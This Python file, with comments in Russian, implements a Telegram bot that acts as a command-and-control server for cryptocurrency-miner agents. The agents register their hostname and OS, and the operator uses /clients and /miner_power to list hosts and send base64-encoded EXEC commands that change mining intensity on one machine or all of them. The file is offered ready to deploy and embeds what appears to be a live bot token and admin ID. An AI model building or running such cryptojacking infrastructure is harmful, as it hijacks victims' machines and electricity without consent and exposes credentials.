#!/usr/bin/env python3
# bot.py — для BotHost (bot-hosting.ru)
# Загрузите этот файл в корень проекта бота.

import telebot, json, time, base64, os, re

TOKEN = os.environ.get("BOT_TOKEN", "8800452125:AAETWvKIeP6BgDKWaSAmAhGm6WAq8TCm7pc")  # или вставьте токен напрямую
ADMIN_ID = 6099860667  # ваш числовой Telegram ID

bot = telebot.TeleBot(TOKEN)
agents = {}

def send_exec(cid, cmd):
    packet = {"cmd": cmd, "ts": int(time.time())}
    payload = base64.b64encode(json.dumps(packet).encode()).decode()
    try:
        bot.send_message(cid, f"EXEC:{payload}")
        return True
    except:
        return False

@bot.message_handler(commands=['start', 'help'])
def help_cmd(msg):
    if msg.from_user.id != ADMIN_ID:
        bot.reply_to(msg, "Нет доступа")
        return
    bot.reply_to(msg, "/clients - список\n/miner_power <id|all> <0-100> - мощность\n/status - статистика")

@bot.message_handler(commands=['clients'])
def clients_cmd(msg):
    if msg.from_user.id != ADMIN_ID: return
    if not agents:
        bot.reply_to(msg, "Нет агентов")
    else:
        text = "\n".join([f"{cid}: {i['hostname']} ({i.get('intensity','?')}%)" for cid,i in agents.items()])
        bot.reply_to(msg, text)

@bot.message_handler(commands=['miner_power'])
def miner_power_cmd(msg):
    if msg.from_user.id != ADMIN_ID: return
    parts = msg.text.split()
    if len(parts) < 3:
        bot.reply_to(msg, "Формат: /miner_power <id|all> <0-100>")
        return
    target = parts[1].lower()
    intensity = int(parts[2])
    cmd = f"MINER_INTENSITY:{intensity}"
    if target == "all":
        for cid in agents:
            send_exec(cid, cmd)
            agents[cid]['intensity'] = intensity
        bot.reply_to(msg, f"Мощность {intensity}% для всех")
    else:
        cid = int(target)
        if cid in agents:
            send_exec(cid, cmd)
            agents[cid]['intensity'] = intensity
            bot.reply_to(msg, f"Мощность {intensity}% для {agents[cid]['hostname']}")

@bot.message_handler(commands=['status'])
def status_cmd(msg):
    if msg.from_user.id != ADMIN_ID: return
    bot.reply_to(msg, f"Агентов: {len(agents)}")

@bot.message_handler(func=lambda m: m.text and m.text.startswith("REG:"))
def reg_agent(msg):
    try:
        data = json.loads(base64.b64decode(msg.text[4:]).decode())
        agents[msg.chat.id] = {"hostname": data.get("hostname","?"), "os": data.get("os","?"), "intensity": 0}
        bot.send_message(ADMIN_ID, f"🟢 Агент: {data.get('hostname')}")
    except: pass

if __name__ == '__main__':
    bot.polling(none_stop=True)
